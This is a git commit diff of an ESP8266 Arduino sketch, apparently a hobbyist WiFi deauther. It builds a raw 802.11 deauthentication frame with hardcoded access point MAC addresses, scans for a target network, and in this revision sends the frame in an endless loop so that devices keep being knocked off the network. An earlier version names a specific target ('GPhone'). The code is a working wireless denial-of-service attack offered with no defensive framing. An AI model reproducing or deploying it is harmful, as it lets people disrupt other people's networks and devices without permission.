554c6ec93ebd0ecbde4f0131da5711ad7d8bca7b
Grant L. <56404949+GrantjyLi@users.noreply.github.com>
2025-03-29 18:46:21 -0400

    Got it working now it doesn't work

--- Deauther/Deauther.ino
+++ Deauther/Deauther.ino
@@ -31,51 +31,37 @@ uint8_t deauthPacket[26] = {
   /*0 - 1*/  0xC0, 0x00, // Frame Control
   /*2 - 3*/  0x00, 0x00, // Duration
   /*4 - 9*/  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast) (all 0xFF means to everyone instead of a specific device)
-  /*10 - 15*/  0x78, 0x8c, 0xb5, 0xf7, 0x8c, 0xaf, // Source (AP MAC)
-  /*16 - 21*/  0x78, 0x8c, 0xb5, 0xf7, 0x8c, 0xaf, // BSSID (AP MAC)
+  /*10 - 15*/  0xbc, 0xc7, 0x46, 0xff, 0x2e, 0xd4, // Source (AP MAC)
+  /*16 - 21*/  0xe4, 0xfa, 0xc4, 0xce, 0x6b, 0xfa, // BSSID (AP MAC)
   /*22 - 23*/  0xFF, 0xFF, // Fragment & Sequence number
   /*24 - 25*/  0x01, 0x00  // Reason code 1 (no reason given)
-  };
-
-void snifferCallback(uint8_t *buf, uint16_t len) {
-  Serial.println("Packet received!"); 
-}
+};
 
 void setup() {
   Serial.begin(115200);
   Serial.println("");
-  Serial.println("Deauthing GPhone");
+  Serial.printf("Deauthing %s\n", targetSSID);
   found = false;
 
-  // Set WiFi to station mode and disconnect from any AP
-  // WiFi.mode(WIFI_STA);
-  // wifi_promiscuous_enable(1);
-  // delay(100);
-
-  wifi_set_promiscuous_rx_cb(snifferCallback);
   wifi_promiscuous_enable(1);
 
   delay(100);
-  
-  Serial.printf("Free heap: %d bytes\n", ESP.getFreeHeap());
 }
 
 void loop() {
-  // if(!found){
-  //   Serial.println("Trying to find target...");
-  //   findNewNetworks();
-  // }else{
-  //   Serial.println("Deauthing...");
-  //   deauthAttack(targetBSSID);
-  // }
-
-  deauthAttack();
+  if(!found){
+    Serial.println("Trying to find target...");
+    findNewNetworks();
+  }else{
+    Serial.println("Deauthing...");
+    deauthAttack(targetBSSID);
+  }
   
   delay(20);
 }
-void deauthAttack() {
-// void deauthAttack(uint8_t* apMac) {
-  Serial.println("\nSending Deauth Packets...");
+// void deauthAttack() {
+void deauthAttack(uint8_t* apMac) {
+  targetChannel = 7;
   wifi_set_channel(targetChannel);//same channel as target AP
   uint8_t newPacket[packetSize];
   memcpy(newPacket, deauthPacket, packetSize);
@@ -83,11 +69,11 @@ void deauthAttack() {
   // memcpy(&newPacket[10], apMac, MAC_ADDR_LEN);
   // memcpy(&newPacket[16], apMac, MAC_ADDR_LEN);
 
-  for (int i = 0; i < 5; i++) {
+  while (true){
     if(wifi_send_pkt_freedom(newPacket, 26, 0) != 0){
-      Serial.print(".");
+      Serial.println("DEAUTH PACKET SENT");
     }else{
-      Serial.print("!");
+      Serial.println("DEAUTH PACKET FAILED");
     }
     delay(20);  // Adjust delay as needed
   }
@@ -95,7 +81,7 @@ void deauthAttack() {
 
 void restart(){
   for(uint8_t i =0 ; i < numNetworks; i++){
-    free(knownBSSIDS);
+    free(knownBSSIDS[i]);
   }
   numNetworks = 0;
   Serial.println("Memory Resetted.");
